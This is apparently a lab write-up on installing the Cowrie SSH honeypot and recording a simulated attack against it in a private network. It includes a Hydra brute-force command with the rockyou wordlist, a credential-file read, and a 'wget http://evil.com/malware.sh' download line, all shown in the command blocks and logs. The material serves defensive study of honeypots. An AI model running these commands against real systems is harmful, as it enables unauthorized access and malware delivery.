# Cowrie SSH Honeypot

## What is Cowrie

Cowrie is an open source SSH honeypot used in real SOC environments for threat intelligence. It emulates a real Linux server, accepts any password, and logs every attacker action - commands executed, files downloaded, credentials tried. Collected data is used to analyze attacker TTPs (Tactics, Techniques and Procedures).

## Installation

Installed on Ubuntu alongside Wazuh under dedicated user:
```bash
sudo adduser --disabled-password cowrie
sudo su - cowrie
git clone https://github.com/cowrie/cowrie
cd cowrie
virtualenv cowrie-env
source cowrie-env/bin/activate
pip install -r requirements.txt
pip install -e .
cowrie start
```

**Listening port:** 2222 (fake SSH server)  
**Real SSH:** port 22 (still active)

## Attack Simulation

Hydra brute forced Cowrie on port 2222:
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.102 -s 2222 -t 4 -I
```

Cowrie accepted passwords `12345`, `password`, `123456789` - attacker thinks server is compromised.

Manual connection to honeypot simulating post-exploitation:
```bash
ssh root@192.168.56.102 -p 2222
```

Commands executed inside honeypot:
```bash
whoami
ls
cat /etc/passwd
uname -a
ps aux
wget http://evil.com/malware.sh
```

## Cowrie Logged Everything
```
[HoneyPotSSHTransport,5,192.168.56.103] CMD: whoami
[HoneyPotSSHTransport,5,192.168.56.103] CMD: cat /etc/passwd
[HoneyPotSSHTransport,5,192.168.56.103] CMD: wget http://evil.com/malware.sh
[HTTP11ClientProtocol,client] Downloaded URL (http://evil.com/malware.sh) 
with SHA-256 dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0
to var/lib/cowrie/downloads/
```
<img width="1280" height="677" alt="image" src="https://github.com/user-attachments/assets/19a4322c-2408-4bff-a90c-863cc86c9c43" />

Cowrie downloaded the malware file and saved it with SHA-256 hash for analysis. In real SOC this hash is submitted to VirusTotal for malware identification.

## Key Takeaways

- Attacker IP: 192.168.56.103 (Kali)
- Credentials tried: root/12345, root/password, root/123456789
- Commands executed: whoami, ls, cat /etc/passwd, uname -a, ps aux
- Malware download attempt: http://evil.com/malware.sh
- SHA-256: dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0
- All attacker TTPs captured without exposing real system
